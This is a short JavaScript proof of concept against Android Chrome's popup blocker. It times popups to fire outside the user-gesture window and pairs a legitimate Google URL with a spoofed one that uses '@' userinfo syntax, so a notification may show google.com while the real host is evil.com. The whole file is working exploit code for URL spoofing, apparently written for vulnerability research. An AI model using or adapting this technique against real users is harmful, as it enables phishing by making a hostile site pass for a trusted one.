// Popup URL Spoof POC — Android Chrome
// Uses long delay to escape user gesture window → popups get blocked

(function() {
  var LEGIT = 'https://www.google.com/search?q=what+is+claude';
  var SPOOF = 'https://www.google.com@evil.com/example-thing#search?q=what+is+claude';

  var el = document.getElementById('countdown');
  var sec = 6;

  // Countdown timer
  function tick() {
    if (sec <= 0) {
      if (el) el.textContent = 'Firing popups now...';
      // Open BOTH popups — outside user gesture → blocked
      window.open(LEGIT, '_blank');
      window.open(SPOOF, '_blank');
      if (el) el.textContent = 'Done! Check popup blocker notification at bottom.';
      return;
    }
    if (el) el.textContent = 'Popups fire in ' + sec + 's (outside user gesture → will be blocked)';
    sec--;
    setTimeout(tick, 1000);
  }

  // Start countdown after page load
  if (document.readyState === 'complete') tick();
  else window.addEventListener('load', function() { setTimeout(tick, 500); });

  // Also allow instant test via buttons (these open directly since user gesture is active)
  document.getElementById('btnNow').addEventListener('click', function() {
    window.open(LEGIT, '_blank');
    window.open(SPOOF, '_blank');
    if (el) el.textContent = 'Opened directly (user gesture active). Wait for auto-trigger to see blocked version.';
  });
})();
